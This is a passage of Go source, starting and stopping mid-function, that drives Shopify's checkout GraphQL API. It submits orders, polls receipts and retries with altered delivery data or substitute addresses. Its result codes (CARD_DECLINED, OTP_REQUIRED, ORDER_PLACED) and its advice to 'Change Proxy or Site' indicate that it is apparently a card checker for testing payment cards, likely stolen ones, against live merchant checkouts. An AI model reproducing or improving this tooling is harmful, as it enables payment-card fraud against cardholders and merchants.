                        "tip":                  map[string]interface{}{"tipLines": []interface{}{}},
                        "note":                 map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
                        "localizationExtension": map[string]interface{}{"fields": []interface{}{}},
                        "nonNegotiableTerms":   nil,
                        "optionalDuties":       map[string]interface{}{"buyerRefusesDuties": false},
                        "scriptFingerprint": map[string]interface{}{
                                "signature": nil, "signatureUuid": nil,
                                "lineItemScriptChanges": []interface{}{}, "paymentScriptChanges": []interface{}{},
                                "shippingScriptChanges": []interface{}{},
                        },
                        "cartMetafields": []interface{}{},
                },
                "attemptToken": attemptToken,
                "metafields":   []interface{}{},
                "analytics": map[string]interface{}{"requestUrl": checkoutFinalURL, "pageId": generatePageID()},
        }

        // Forward checkpointData if Shopify returned it in the proposal
        // api.py line 1287: if checkpoint_data: submit_variables['input']['checkpointData'] = checkpoint_data
        if checkpointData != "" {
                if inp, ok := submitVars["input"].(map[string]interface{}); ok {
                        inp["checkpointData"] = checkpointData
                }
        }

        submitBody := map[string]interface{}{
                "id":            opIDSubmitForCompletion,
                "variables":     submitVars,
                "operationName": "SubmitForCompletion",
        }

        _, submitText, err := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, submitBody)
        if err != nil {
                return CheckResult{false, "Submit error: " + err.Error(), gateway, totalPrice, currency}
        }

        if isCaptchaRequired(submitText) {
                return CheckResult{false, "CARD_DECLINED", gateway, totalPrice, currency}
        }

        var submitResp map[string]interface{}
        if json.Unmarshal([]byte(submitText), &submitResp) != nil {
                return CheckResult{false, extractCleanResponse(submitText), gateway, totalPrice, currency}
        }

        submitResult := navMap(submitResp, "data", "submitForCompletion")
        if submitResult == nil {
                return CheckResult{false, extractCleanResponse(submitText), gateway, totalPrice, currency}
        }

        typeName := fmt.Sprintf("%v", submitResult["__typename"])

        switch typeName {
        case "SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion", "SubmitSuccessWithReceipt":
                // Mirror Python exactly:
                // 1. ProcessedReceipt -> ORDER_PLACED immediately
                // 2. ProcessingReceipt/WaitingReceipt -> poll loop
                // 3. No receipt or no ID -> return false (declined)
                // 4. FailedReceipt -> return true (charged) with decline code (Python does this!)
                receiptRaw := navMap(submitResult, "receipt")
                if receiptRaw == nil || len(receiptRaw) == 0 {
                        // Python: "if not receipt: return False, 'No receipt in submit response'"
                        return CheckResult{false, "SubmitSuccess but no receipt", gateway, totalPrice, currency}
                }

                recTypeName := fmt.Sprintf("%v", receiptRaw["__typename"])
                if recTypeName == "ProcessedReceipt" {
                        if po := navMap(receiptRaw, "purchaseOrder"); po != nil {
                                if tp := navMap(po, "totalAmountToPay"); tp != nil {
                                        if a := fmt.Sprintf("%v", tp["amount"]); a != "" && a != "<nil>" {
                                                totalPrice = a
                                        }
                                        if c := fmt.Sprintf("%v", tp["currencyCode"]); c != "" && c != "<nil>" {
                                                currency = c
                                        }
                                }
                        }
                        return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                }

                // Need to poll - get receipt ID
                receiptID := fmt.Sprintf("%v", receiptRaw["id"])
                if receiptID == "" || receiptID == "<nil>" {
                        return CheckResult{false, "No receipt ID", gateway, totalPrice, currency}
                }

                // Poll up to 4 times, 1s initial sleep (matches Python)
                pollBodyMap := map[string]interface{}{
                        "id":            opIDPollForReceipt,
                        "variables":     map[string]interface{}{"receiptId": receiptID, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                }
                time.Sleep(1 * time.Second)
                var lastPollText string
                for poll := 0; poll < 4; poll++ {
                        _, pollText, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "PollForReceipt"}, gqlHeaders, pollBodyMap)
                        lastPollText = pollText
                        if isCaptchaRequired(pollText) {
                                return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                        }
                        var pollResp map[string]interface{}
                        if json.Unmarshal([]byte(pollText), &pollResp) != nil {
                                time.Sleep(1 * time.Second)
                                continue
                        }
                        rec := navMap(pollResp, "data", "receipt")
                        if rec == nil {
                                if strings.Contains(pollText, "WaitingReceipt") {
                                        time.Sleep(1 * time.Second)
                                        continue
                                }
                                break
                        }
                        recType := fmt.Sprintf("%v", rec["__typename"])
                        switch recType {
                        case "ProcessedReceipt":
                                if po := navMap(rec, "purchaseOrder"); po != nil {
                                        if tp := navMap(po, "totalAmountToPay"); tp != nil {
                                                if a := fmt.Sprintf("%v", tp["amount"]); a != "" && a != "<nil>" {
                                                        totalPrice = a
                                                }
                                                if c := fmt.Sprintf("%v", tp["currencyCode"]); c != "" && c != "<nil>" {
                                                        currency = c
                                                }
                                        }
                                }
                                return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                        case "FailedReceipt":
                                // Python returns True (charged=true) for FailedReceipt - bank DID respond
                                if pe := navMap(rec, "processingError"); pe != nil {
                                        errType := fmt.Sprintf("%v", pe["__typename"])
                                        if errType == "PaymentFailed" {
                                                code := fmt.Sprintf("%v", pe["code"])
                                        msg := fmt.Sprintf("%v", pe["messageUntranslated"])
                                                                                        if (code == "GENERIC_ERROR" || code == "PAYMENT_FAILED" || code == "<nil>" || code == "") && msg != "" && msg != "<nil>" {
                                                                                        return CheckResult{true, sanitizeMsg(extractCleanResponse(msg)), gateway, totalPrice, currency}
                                                                                }
                                                                                if code != "" && code != "<nil>" {
                                                                                        return CheckResult{true, sanitizeMsg(extractCleanResponse(code)), gateway, totalPrice, currency}
                                                                                }
                                                                        }
                                                                        code := fmt.Sprintf("%v", pe["code"])
                                                                        if code != "" && code != "<nil>" {
                                                                                return CheckResult{true, sanitizeMsg(extractCleanResponse(code)), gateway, totalPrice, currency}
                                                                        }
                                                                }
                                                                return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                                                        case "ActionRequiredReceipt":
                                                                return CheckResult{true, "OTP_REQUIRED", gateway, totalPrice, currency}
                                                        case "ProcessingReceipt", "WaitingReceipt":
                                                                time.Sleep(1 * time.Second)
                                                                continue
                                                        }
                                                        if !strings.Contains(recType, "Waiting") && !strings.Contains(recType, "Processing") {
                                                                break
                                                        }
                                                }

                // After poll loop - mirror Python's last-resort logic exactly
                if isCaptchaRequired(lastPollText) {
                        return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                }
                if strings.Contains(lastPollText, "WaitingReceipt") {
                        return CheckResult{false, "Change Proxy or Site", gateway, totalPrice, currency}
                }
                if strings.Contains(lastPollText, "shopify_payments") {
                        return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                }
                // JSON parse fallback (Python: res_json -> processingError.code)
                var lastPollJ map[string]interface{}
                if json.Unmarshal([]byte(lastPollText), &lastPollJ) == nil {
                        if peCode := navMap(lastPollJ, "data", "receipt", "processingError"); peCode != nil {
                                if c := fmt.Sprintf("%v", peCode["code"]); c != "" && c != "<nil>" {
                                        return CheckResult{true, sanitizeMsg(extractCleanResponse(c)), gateway, totalPrice, currency}
                                }
                        }
                        // Python: if "shopify_payments" in str(res_json) -> ORDER_PLACED
                        // Python: elif result -> True, result  (already handled above)
                        // Python: else -> True, "MISMATCHED_BILL"
                        return CheckResult{true, "MISMATCHED_BILL", gateway, totalPrice, currency}
                }
                // Raw text fallbacks matching Python's final if/elif chain
                lastLower := strings.ToLower(lastPollText)
                rawCode := extractBetween(lastPollText, `{"code":"`, `"`)
                if strings.Contains(lastLower, "actionreq") || strings.Contains(lastLower, "action_required") {
                        return CheckResult{true, "OTP_REQUIRED", gateway, totalPrice, currency}
                } else if strings.Contains(lastLower, "processedreceipt") {
                        return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                } else if strings.Contains(lastLower, "failedreceipt") || strings.Contains(lastLower, "declined") {
                        if rawCode != "" {
                                return CheckResult{true, sanitizeMsg(extractCleanResponse(rawCode)), gateway, totalPrice, currency}
                        }
                        return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                }
                return CheckResult{false, "CARD_DECLINED", gateway, totalPrice, currency}

        case "SubmitFailed":
                reason := fmt.Sprintf("%v", submitResult["reason"])
                reasonLower := strings.ToLower(reason)
                // Python: if reason contains delivery-changed language, do one re-submit attempt
                sfDeliveryChanged := strings.Contains(reasonLower, "delivery details may have changed") ||
                        strings.Contains(reasonLower, "delivery has changed") ||
                        strings.Contains(reasonLower, "delivery_delivery_line_detail") ||
                        strings.Contains(reasonLower, "delivery line")
                if sfDeliveryChanged && !deliveryRetried {
                        deliveryRetried = true
                        sfCopy := deepCopyMap(submitVars)
                        sfData := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": sfCopy, "operationName": "SubmitForCompletion"}
                        _, sfTxt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, sfData)
                        if sfTxt != "" {
                                var sfJ map[string]interface{}
                                if json.Unmarshal([]byte(sfTxt), &sfJ) == nil {
                                        if sfR := navMap(sfJ, "data", "submitForCompletion"); sfR != nil {
                                                sfT := fmt.Sprintf("%v", sfR["__typename"])
                                                if sfT == "SubmitSuccess" || sfT == "SubmitAlreadyAccepted" || sfT == "SubmittedForCompletion" || sfT == "SubmitSuccessWithReceipt" {
                                                        return evalRetrySubmit(sfR, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                }
                                        }
                                }
                        }
                }
                return CheckResult{false, extractCleanResponse(reason), gateway, totalPrice, currency}

        case "SubmitRejected":
                errs := navSlice(submitResult, "errors")
                firstCode := ""
                firstMsg := ""
                for _, e := range errs {
                        em, ok := e.(map[string]interface{})
                        if !ok {
                                continue
                        }
                        code := fmt.Sprintf("%v", em["code"])
                        locMsg := fmt.Sprintf("%v", em["localizedMessage"])
                        nonLocMsg := fmt.Sprintf("%v", em["nonLocalizedMessage"])
                        if code == "<nil>" {
                                code = ""
                        }
                        combinedLower := strings.ToLower(locMsg + " " + nonLocMsg + " " + code)

                        // â”€â”€ Retry 1: delivery line changed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                        isDeliveryChanged := strings.Contains(code, "DELIVERY_DELIVERY_LINE_DETAIL") ||
                                strings.Contains(code, "DELIVERY_LINE_DETAIL") ||
                                strings.Contains(combinedLower, "delivery details may have changed") ||
                                strings.Contains(combinedLower, "verify your shipping") ||
                                strings.Contains(combinedLower, "shipping method")

                        if isDeliveryChanged {
                                // Digital: re-propose with NONE strategy, get fresh queueToken, re-submit
                                if !requiresShipping {
                                        dBody := map[string]interface{}{
                                                "id": opIDProposal,
                                                "variables": map[string]interface{}{
                                                        "sessionInput": map[string]interface{}{"sessionToken": sst},
                                                        "queueToken":   queueToken,
                                                        "discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
                                                        "delivery": map[string]interface{}{
                                                                "deliveryLines": []interface{}{map[string]interface{}{
                                                                        "selectedDeliveryStrategy": map[string]interface{}{
                                                                                "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                                                        "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                                                        "shipments":              map[string]interface{}{"any": true},
                                                                                },
                                                                                "options": map[string]interface{}{},
                                                                        },
                                                                        "targetMerchandiseLines": map[string]interface{}{"any": true},
                                                                        "deliveryMethodTypes":    []string{"NONE"},
                                                                        "expectedTotalPrice":     map[string]interface{}{"any": true},
                                                                        "destinationChanged":     true,
                                                                }},
                                                                "noDeliveryRequired":           []interface{}{},
                                                                "useProgressiveRates":          false,
                                                                "prefetchShippingRatesStrategy": nil,
                                                                "supportsSplitShipping":        true,
                                                        },
                                                        "deliveryExpectations":  map[string]interface{}{"deliveryExpectationLines": []interface{}{}},
                                                        "merchandise":           map[string]interface{}{"merchandiseLines": merchandiseLines},
                                                        "payment":               map[string]interface{}{"totalAmount": map[string]interface{}{"any": true}, "paymentLines": []interface{}{}, "billingAddress": map[string]interface{}{"streetAddress": map[string]interface{}{"address1": "", "city": "", "countryCode": addr.CountryCode, "lastName": "", "zoneCode": addr.ZoneCode, "phone": ""}}},
                                                        "buyerIdentity":         proposalVars["buyerIdentity"],
                                                        "tip":                   map[string]interface{}{"tipLines": []interface{}{}},
                                                        "taxes":                 proposalVars["taxes"],
                                                        "note":                  map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
                                                        "localizationExtension": map[string]interface{}{"fields": []interface{}{}},
                                                        "nonNegotiableTerms":    nil,
                                                        "scriptFingerprint":     proposalVars["scriptFingerprint"],
                                                        "optionalDuties":        map[string]interface{}{"buyerRefusesDuties": false},
                                                },
                                                "operationName": "Proposal",
                                        }
                                        _, dTxt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, dBody)
                                        newQT := queueToken
                                        if dj := func() map[string]interface{} { var m map[string]interface{}; json.Unmarshal([]byte(dTxt), &m); return m }(); dj != nil {
                                                if r := navMap(dj, "data", "session", "negotiate", "result"); r != nil {
                                                        if qt := fmt.Sprintf("%v", r["queueToken"]); qt != "" && qt != "<nil>" {
                                                                newQT = qt
                                                        }
                                                }
                                        }
                                        // Re-submit with fresh queueToken + any-delivery
                                        dsv := deepCopyMap(submitVars)
                                        if inp, ok := dsv["input"].(map[string]interface{}); ok {
                                                inp["queueToken"] = newQT
                                                inp["delivery"] = map[string]interface{}{
                                                        "deliveryLines": []interface{}{map[string]interface{}{
                                                                "selectedDeliveryStrategy": map[string]interface{}{
                                                                        "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                                                "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                                                "shipments":              map[string]interface{}{"any": true},
                                                                        },
                                                                        "options": map[string]interface{}{},
                                                                },
                                                                "targetMerchandiseLines": map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}},
                                                                "deliveryMethodTypes":    []string{"NONE"},
                                                                "expectedTotalPrice":     map[string]interface{}{"any": true},
                                                                "destinationChanged":     true,
                                                        }},
                                                        "noDeliveryRequired":           []interface{}{},
                                                        "useProgressiveRates":          false,
                                                        "prefetchShippingRatesStrategy": nil,
                                                        "supportsSplitShipping":        true,
                                                }
                                        }
                                        dsd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": dsv, "operationName": "SubmitForCompletion"}
                                        _, dst, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, dsd)
                                        if dst != "" {
                                                var dj2 map[string]interface{}
                                                if json.Unmarshal([]byte(dst), &dj2) == nil {
                                                if sr := navMap(dj2, "data", "submitForCompletion"); sr != nil {
                                                        t2 := fmt.Sprintf("%v", sr["__typename"])
                                                        if t2 == "SubmitSuccess" || t2 == "SubmitAlreadyAccepted" || t2 == "SubmittedForCompletion" || t2 == "SubmitSuccessWithReceipt" {
                                                                return evalRetrySubmit(sr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                        } else if t2 == "SubmitFailed" {
                                                                return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", sr["reason"])), gateway, totalPrice, currency}
                                                        } else if t2 == "SubmitRejected" {
                                                                errs2 := navSlice(sr, "errors")
                                                                        if len(errs2) > 0 {
                                                                                if em2, ok := errs2[0].(map[string]interface{}); ok {
                                                                                        c2 := fmt.Sprintf("%v", em2["code"])
                                                                                        lm2 := fmt.Sprintf("%v", em2["localizedMessage"])
                                                                                        if c2 != "" && c2 != "<nil>" {
                                                                                                return CheckResult{false, extractCleanResponse(c2), gateway, totalPrice, currency}
                                                                                        }
                                                                                        return CheckResult{false, extractCleanResponse(lm2), gateway, totalPrice, currency}
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                        return CheckResult{false, "DELIVERY_OPTIONS_CHANGED", gateway, totalPrice, currency}
                                }

                                // Physical: re-propose shipping â†’ get fresh handle â†’ re-propose delivery â†’ re-submit
                                fp1Body := map[string]interface{}{
                                        "id": opIDProposal,
                                        "variables": map[string]interface{}{
                                                "sessionInput": map[string]interface{}{"sessionToken": sst},
                                                "queueToken":   queueToken,
                                                "discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
                                                "delivery": map[string]interface{}{
                                                        "deliveryLines": []interface{}{map[string]interface{}{
                                                                "destination": map[string]interface{}{
                                                                        "partialStreetAddress": map[string]interface{}{
                                                                                "address1": addr.Address1, "address2": "", "city": addr.City,
                                                                                "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                                                                "firstName": firstName, "lastName": lastName,
                                                                                "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                                                        },
                                                                },
                                                                "selectedDeliveryStrategy": map[string]interface{}{
                                                                        "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                                                "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                                                "shipments":              map[string]interface{}{"any": true},
                                                                        },
                                                                        "options": map[string]interface{}{},
                                                                },
                                                                "targetMerchandiseLines": map[string]interface{}{"any": true},
                                                                "deliveryMethodTypes":    []string{"SHIPPING"},
                                                                "expectedTotalPrice":     map[string]interface{}{"any": true},
                                                                "destinationChanged":     false,
                                                        }},
                                                        "noDeliveryRequired":           []interface{}{},
                                                        "useProgressiveRates":          false,
                                                        "prefetchShippingRatesStrategy": nil,
                                                        "supportsSplitShipping":        true,
                                                },
                                                "deliveryExpectations":  map[string]interface{}{"deliveryExpectationLines": []interface{}{}},
                                                "merchandise":           map[string]interface{}{"merchandiseLines": merchandiseLines},
                                                "payment":               map[string]interface{}{"totalAmount": map[string]interface{}{"any": true}, "paymentLines": []interface{}{}, "billingAddress": map[string]interface{}{"streetAddress": map[string]interface{}{"address1": "", "city": "", "countryCode": addr.CountryCode, "lastName": "", "zoneCode": addr.ZoneCode, "phone": ""}}},
                                                "buyerIdentity":         proposalVars["buyerIdentity"],
                                                "tip":                   map[string]interface{}{"tipLines": []interface{}{}},
                                                "taxes":                 proposalVars["taxes"],
                                                "note":                  map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
                                                "localizationExtension": map[string]interface{}{"fields": []interface{}{}},
                                                "nonNegotiableTerms":    nil,
                                                "scriptFingerprint":     proposalVars["scriptFingerprint"],
                                                "optionalDuties":        map[string]interface{}{"buyerRefusesDuties": false},
                                        },
                                        "operationName": "Proposal",
                                }
                                _, fp1Txt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, fp1Body)
                                newStrat := deliveryStrategy
                                newShip := shippingAmount
                                newTax := taxAmount
                                if fp1j := func() map[string]interface{} { var m map[string]interface{}; json.Unmarshal([]byte(fp1Txt), &m); return m }(); fp1j != nil {
                                        sp1 := navMap(fp1j, "data", "session", "negotiate", "result", "sellerProposal")
                                        if sp1 != nil {
                                                if dlLines := navSlice(sp1, "delivery", "deliveryLines"); len(dlLines) > 0 {
                                                        if dlm := navMap(dlLines[0]); dlm != nil {
                                                                if avail := navSlice(dlm, "availableDeliveryStrategies"); len(avail) > 0 {
                                                                        if stm := navMap(avail[0]); stm != nil {
                                                                                if h := fmt.Sprintf("%v", stm["handle"]); h != "" && h != "<nil>" {
                                                                                        newStrat = h
                                                                                }
                                                                                if amt := navMap(stm, "amount", "value"); amt != nil {
                                                                                        newShip = fmt.Sprintf("%v", amt["amount"])
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                                if taxM := navMap(sp1, "tax", "totalTaxAmount", "value"); taxM != nil {
                                                        newTax = fmt.Sprintf("%v", taxM["amount"])
                                                }
                                        }
                                }

                                // Re-propose delivery with fresh strategy
                                vars1 := fp1Body["variables"].(map[string]interface{})
                                dl1 := vars1["delivery"].(map[string]interface{})
                                dlLines1 := dl1["deliveryLines"].([]interface{})
                                dlLine1 := dlLines1[0].(map[string]interface{})
                                dlLine1["selectedDeliveryStrategy"] = map[string]interface{}{
                                        "deliveryStrategyByHandle": map[string]interface{}{"handle": newStrat, "customDeliveryRate": false},
                                        "options": map[string]interface{}{},
                                }
                                dlLine1["targetMerchandiseLines"] = map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}}
                                dlLine1["expectedTotalPrice"] = map[string]interface{}{"value": map[string]interface{}{"amount": newShip, "currencyCode": currency}}
                                dlLine1["destinationChanged"] = false
                                vars1["payment"].(map[string]interface{})["billingAddress"] = map[string]interface{}{
                                        "streetAddress": map[string]interface{}{
                                                "address1": addr.Address1, "address2": "", "city": addr.City,
                                                "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                                "firstName": firstName, "lastName": lastName,
                                                "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                        },
                                }
                                doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, fp1Body) //nolint

                                // Re-submit with fresh delivery strategy
                                fsv := deepCopyMap(submitVars)
                                if inp := fsv["input"].(map[string]interface{}); inp != nil {
                                        if fDel, ok := inp["delivery"].(map[string]interface{}); ok {
                                                if fdLines, ok := fDel["deliveryLines"].([]interface{}); ok && len(fdLines) > 0 {
                                                        if fdl, ok := fdLines[0].(map[string]interface{}); ok {
                                                                fdl["selectedDeliveryStrategy"] = map[string]interface{}{
                                                                        "deliveryStrategyByHandle": map[string]interface{}{"handle": newStrat, "customDeliveryRate": false},
                                                                        "options":                  map[string]interface{}{"phone": addr.Phone},
                                                                }
                                                                fdl["expectedTotalPrice"] = map[string]interface{}{"value": map[string]interface{}{"amount": newShip, "currencyCode": currency}}
                                                        }
                                                }
                                        }
                                        if fTax, ok := inp["taxes"].(map[string]interface{}); ok {
                                                if pt, ok := fTax["proposedTotalAmount"].(map[string]interface{}); ok {
                                                        if v, ok := pt["value"].(map[string]interface{}); ok {
                                                                v["amount"] = newTax
                                                        }
                                                }
                                        }
                                }
                                fsd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": fsv, "operationName": "SubmitForCompletion"}
                                _, fst, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, fsd)
                                if fst != "" {
                                        var fsj map[string]interface{}
                                        if json.Unmarshal([]byte(fst), &fsj) == nil {
                                        if fsr := navMap(fsj, "data", "submitForCompletion"); fsr != nil {
                                                ft := fmt.Sprintf("%v", fsr["__typename"])
                                                if ft == "SubmitSuccess" || ft == "SubmitAlreadyAccepted" || ft == "SubmittedForCompletion" || ft == "SubmitSuccessWithReceipt" {
                                                        return evalRetrySubmit(fsr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                } else if ft == "SubmitFailed" {
                                                        return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", fsr["reason"])), gateway, totalPrice, currency}
                                                } else if ft == "SubmitRejected" {
                                                        ferrs := navSlice(fsr, "errors")
                                                                if len(ferrs) > 0 {
                                                                        if fem, ok := ferrs[0].(map[string]interface{}); ok {
                                                                                fc := fmt.Sprintf("%v", fem["code"])
                                                                                flm := fmt.Sprintf("%v", fem["localizedMessage"])
                                                                                if fc != "" && fc != "<nil>" {
                                                                                        return CheckResult{false, sanitizeMsg(extractCleanResponse(fc)), gateway, totalPrice, currency}
                                                                                }
                                                                                return CheckResult{false, sanitizeMsg(extractCleanResponse(flm)), gateway, totalPrice, currency}
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }
                                return CheckResult{false, "DELIVERY_OPTIONS_CHANGED", gateway, totalPrice, currency}
                        }

                        // â”€â”€ Retry 2: price mismatch / order total changed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                        isPriceMismatch := code == "MERCHANDISE_EXPECTED_PRICE_MISMATCH" ||
                                code == "ORDER_TOTAL_CHANGED" ||
                                strings.Contains(combinedLower, "order total has changed")

                        if isPriceMismatch {
                                // Extract new running total from sellerProposal in submit response
                                newTotal := ""
                                if sp := navMap(submitResult, "sellerProposal"); sp != nil {
                                        for _, k := range []string{"runningTotal", "totalAmount", "total"} {
                                                if v := navMap(sp, k, "value"); v != nil {
                                                        if a := fmt.Sprintf("%v", v["amount"]); a != "" && a != "<nil>" {
                                                                newTotal = a
                                                                break
                                                        }
                                                }
                                        }
                                }
                                if newTotal == "" {
                                        // regex fallback on raw text
                                        if m := regexp.MustCompile(`"(?:runningTotal|totalAmount)"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"`).FindStringSubmatch(submitText); len(m) > 1 {
                                                newTotal = m[1]
                                        }
                                }
                                // Re-submit with same body (merchandise already uses {"any":true})
                                psvCopy := deepCopyMap(submitVars)
                                psd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": psvCopy, "operationName": "SubmitForCompletion"}
                                _, pst, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, psd)
                                if pst != "" {
                                        var psj map[string]interface{}
                                        if json.Unmarshal([]byte(pst), &psj) == nil {
                                        if psr := navMap(psj, "data", "submitForCompletion"); psr != nil {
                                                pt2 := fmt.Sprintf("%v", psr["__typename"])
                                                if pt2 == "SubmitSuccess" || pt2 == "SubmitAlreadyAccepted" || pt2 == "SubmittedForCompletion" || pt2 == "SubmitSuccessWithReceipt" {
                                                        if newTotal != "" {
                                                                totalPrice = newTotal
                                                        }
                                                        return evalRetrySubmit(psr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                } else if pt2 == "SubmitFailed" {
                                                        return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", psr["reason"])), gateway, totalPrice, currency}
                                                } else if pt2 == "SubmitRejected" {
                                                        perrs := navSlice(psr, "errors")
                                                                if len(perrs) > 0 {
                                                                        if pem, ok := perrs[0].(map[string]interface{}); ok {
                                                                                pc := fmt.Sprintf("%v", pem["code"])
                                                                                plm := fmt.Sprintf("%v", pem["localizedMessage"])
                                                                                if pc != "" && pc != "<nil>" {
                                                                                        return CheckResult{false, sanitizeMsg(extractCleanResponse(pc)), gateway, totalPrice, currency}
                                                                                }
                                                                                return CheckResult{false, sanitizeMsg(extractCleanResponse(plm)), gateway, totalPrice, currency}
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }
                                return CheckResult{false, "ORDER_TOTAL_CHANGED", gateway, totalPrice, currency}
                        }

                        // â”€â”€ Retry 3: delivery address mismatch â€” try US fallback address â”€â”€â”€â”€
                        isDeliveryAddr := code == "DELIVERY_ADDRESS" ||
                                code == "DELIVERY_ADDRESS_INVALID" ||
                                code == "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE" ||
                                code == "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE" ||
                                strings.Contains(combinedLower, "delivery address") ||
                                strings.Contains(combinedLower, "address is invalid") ||
                                strings.Contains(combinedLower, "not deliver to this address") ||
                                strings.Contains(combinedLower, "ship to this address") ||
                                strings.Contains(combinedLower, "no delivery strategy") ||
                                strings.Contains(combinedLower, "no delivery available")

                        if isDeliveryAddr {
                                // Use the api.py deliveryFallbackCC map: NZ→AU, AU→US, etc.
                                fbCC := "US"
                                if mapped, ok := deliveryFallbackCC[addr.CountryCode]; ok {
                                        fbCC = mapped
                                }
                                fbAddr := pickAddrByCountry(fbCC)
                                fbShipBody := map[string]interface{}{
                                        "id": opIDProposal,
                                        "variables": map[string]interface{}{
                                                "sessionInput": map[string]interface{}{"sessionToken": sst},
                                                "queueToken":   queueToken,
                                                "discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
                                                "delivery": map[string]interface{}{
                                                        "deliveryLines": []interface{}{map[string]interface{}{
                                                                "destination": map[string]interface{}{
                                                                        "partialStreetAddress": map[string]interface{}{
                                                                                "address1": fbAddr.Address1, "address2": "", "city": fbAddr.City,
                                                                                "countryCode": fbAddr.CountryCode, "postalCode": fbAddr.PostalCode,
                                                                                "firstName": firstName, "lastName": lastName,
                                                                                "zoneCode": fbAddr.ZoneCode, "phone": fbAddr.Phone,
                                                                        },
                                                                },
                                                                "selectedDeliveryStrategy": map[string]interface{}{
                                                                        "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                                                "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                                                "shipments":              map[string]interface{}{"any": true},
                                                                        },
                                                                        "options": map[string]interface{}{},
                                                                },
                                                                "targetMerchandiseLines": map[string]interface{}{"any": true},
                                                                "deliveryMethodTypes":    []string{"SHIPPING"},
                                                                "expectedTotalPrice":     map[string]interface{}{"any": true},
                                                                "destinationChanged":     true,
                                                        }},
                                                        "noDeliveryRequired":            []interface{}{},
                                                        "useProgressiveRates":           false,
                                                        "prefetchShippingRatesStrategy": nil,
                                                        "supportsSplitShipping":         true,
                                                },
                                                "deliveryExpectations":  map[string]interface{}{"deliveryExpectationLines": []interface{}{}},
                                                "merchandise":           map[string]interface{}{"merchandiseLines": merchandiseLines},
                                                "payment":               map[string]interface{}{"totalAmount": map[string]interface{}{"any": true}, "paymentLines": []interface{}{}, "billingAddress": map[string]interface{}{"streetAddress": map[string]interface{}{"address1": "", "city": "", "countryCode": fbAddr.CountryCode, "lastName": "", "zoneCode": fbAddr.ZoneCode, "phone": ""}}},
                                                "buyerIdentity":         proposalVars["buyerIdentity"],
                                                "tip":                   map[string]interface{}{"tipLines": []interface{}{}},
                                                "taxes":                 proposalVars["taxes"],
                                                "note":                  map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
                                                "localizationExtension": map[string]interface{}{"fields": []interface{}{}},
                                                "nonNegotiableTerms":    nil,
                                                "scriptFingerprint":     proposalVars["scriptFingerprint"],
                                                "optionalDuties":        map[string]interface{}{"buyerRefusesDuties": false},
                                        },
                                        "operationName": "Proposal",
                                }
                                _, fbShipTxt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, fbShipBody)
